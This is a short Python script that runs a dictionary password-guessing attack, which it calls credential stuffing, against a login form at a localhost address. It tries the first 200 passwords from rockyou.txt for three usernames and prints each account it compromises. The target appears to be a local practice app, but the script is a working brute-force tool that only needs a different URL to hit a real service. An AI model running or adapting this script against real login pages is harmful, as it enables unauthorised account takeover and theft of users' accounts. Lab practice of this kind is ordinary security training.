import requests

target_url = "http://127.0.0.1:5000/login"
usernames = ["admin", "john", "test"]  # all 3 users we are attacking

# Read passwords from rockyou.txt
with open("rockyou.txt", "r", encoding="latin-1") as f:
    passwords = f.readlines()

print(f"Starting credential stuffing attack...")
print(f"Trying {len(passwords[:200])} passwords on {len(usernames)} accounts...")
print("-" * 40)

compromised = []

for username in usernames:
    print(f"\nAttacking account: {username}")
    found = False
    for i, password in enumerate(passwords[:200]):
        password = password.strip()
        
        data = {
            "username": username,
            "password": password
        }
        
        response = requests.post(target_url, data=data)
        
        if "Login successful!" in response.text:
            print(f"PASSWORD FOUND! {username}:{password} (after {i+1} attempts)")
            compromised.append((username, password))
            found = True
            break
        else:
            print(f"Attempt {i+1}: {password} - Failed")
    
    if not found:
        print(f"Password not found for {username}")

print("\n" + "-" * 40)
print(f"Attack complete! {len(compromised)} accounts compromised:")
for user, pwd in compromised:
    print(f"  → {user}:{pwd}")